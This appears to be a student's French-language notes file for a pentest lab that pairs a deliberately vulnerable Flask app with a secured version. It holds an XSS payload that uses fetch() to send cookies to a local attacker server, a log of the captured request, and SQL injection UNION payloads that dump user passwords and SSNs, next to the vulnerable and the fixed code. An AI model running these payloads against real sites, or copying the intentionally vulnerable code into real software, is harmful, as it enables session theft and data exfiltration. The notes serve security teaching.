@@ -1,0 +1,204 @@
+.\venv\Scripts\activate
+python -m venv venv
+
+XSS 
+
+dans http://localhost:5000/search
+<script>alert('TestXSS')</script>
+
+<script>
+fetch('http://localhost:5001/steal?c=' + document.cookie, { mode: 'no-cors' })
+</script>
+
+visualiser le résultat dans le terminal attaquant ou dans http://localhost:5001/dashboard
+[!] COOKIE VOLÉ (2025-06-29 21:04:21):
+127.0.0.1 - - [29/Jun/2025 21:04:21] "GET /steal?c= HTTP/1.1" 404 -
+
+Now, on https://localhost:5000
+f12 > stockage > cookies
+refresh
+Now, 
+https://localhost:5000/admin
+
+SQLi
+
+Déterminer le nombre de colonnes 
+' ORDER BY 9-- 
+
+identify version SQL
+' UNION SELECT 1,sqlite_version(),3,4,5,6,7,8,9--
+
+list tables 
+' UNION SELECT 1,group_concat(tbl_name),3,4,5,6,7,8,9 FROM sqlite_master--
+
+Données sensibles 
+' UNION SELECT id,username,password,role,full_name,email,phone,birthdate,ssn FROM user--
+
+
+📁 Projet_Pentest_B3/
+├── 📁 app_vulnerable/          # Version vulnérable (avec XSS et SQLi)
+├── 📁 app_securisee/           # Version corrigée
+├── 📁 attaquant_server/        # Serveur de réception des cookies
+└── 📁 rapport/                 # Documentation
+
+
+
+
+
+
+
+
+
+
+
+#<p>Résultats pour : {{ query | safe }}</p> "safe" à retirer pour empécher XSS
+
+# Remplacer dans app.py
+# Version vulnérable :
+query = f"SELECT * FROM user WHERE full_name LIKE '%{search}%'"
+
+# Version sécurisée :
+stmt = text("SELECT * FROM user WHERE full_name LIKE :search")
+results = db.session.execute(stmt, {'search': f'%{search}%'})
+
+#dans app.py
+app.config.update(
+    SESSION_COOKIE_HTTPONLY=false,
+    SESSION_COOKIE_SECURE=false,
+    REMEMBER_COOKIE_HTTPONLY=false
+)
+
+#Code vulnérabkle dans app.py
+
+@app.route('/admin')
+def admin():
+    # ... [code existant] ...
+    if search:
+        # VULN SQLi intentionnelle
+        query = text(f"SELECT * FROM user WHERE full_name LIKE '%{search}%'")
+        with db.engine.connect() as conn:
+            results = conn.execute(query)
+            users = [dict(row) for row in results.mappings()]
+    # ... [reste du code] ...
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+################################SECURED#############################################
+
+
+
+                                                                                    #route admin dans app.securiséé/app.py
+from sqlalchemy import text
+
+@app.route('/admin')
+def admin():
+    if 'user_id' not in session or session.get('role') != 'admin':
+        flash('Accès non autorisé', 'danger')
+        return redirect(url_for('home'))
+    
+    search = request.args.get('search', '')
+    if search:
+        # REQUÊTE SÉCURISÉE (injection SQL corrigée)
+        stmt = text("SELECT * FROM user WHERE full_name LIKE :search")
+        results = db.session.execute(stmt, {'search': f'%{search}%'})
+        users = [dict(row) for row in results.mappings()]
+    else:
+        # Récupération normale sans recherche
+        users = User.query.all()
+    
+    return render_template('admin.html', users=users)    
+
+
+
+
+                                                                                        
+    
+    
+    
+    
+    
+    
+                                                                                        #Route register dans appsecure/app.py
+# Dans la route /register
+@app.route('/register', methods=['GET', 'POST'])
+def register():
+    if request.method == 'POST':
+        # Validation basique
+        username = request.form['username']
+        if len(username) < 4:
+            flash("Le nom d'utilisateur doit contenir au moins 4 caractères", 'danger')
+            return redirect(url_for('register'))
+        
+        # ... [reste du code] ...
+
+
+
+
+
+
+                                                                        #secur dans app_securisee/templates/search.html
+
+    {% extends "base.html" %}
+
+{% block content %}
+<!-- ... [code existant] ... -->
+<div class="results-container">
+    <!-- CORRECTION XSS : retrait du filtre |safe -->
+    <p>Résultats pour : {{ query }}</p>
+    <!-- ... [reste du code] ... -->
+</div>
+{% endblock %}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                            #Sec cookies dans app.secure/app.py
+# Configuration de sécurité
+app.config.update(
+    SESSION_COOKIE_HTTPONLY=True,    # Empêche l'accès JS aux cookies
+    SESSION_COOKIE_SECURE=True,       # Cookies seulement via HTTPS
+    SESSION_COOKIE_SAMESITE='Lax'     # Protection contre CSRF
+)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
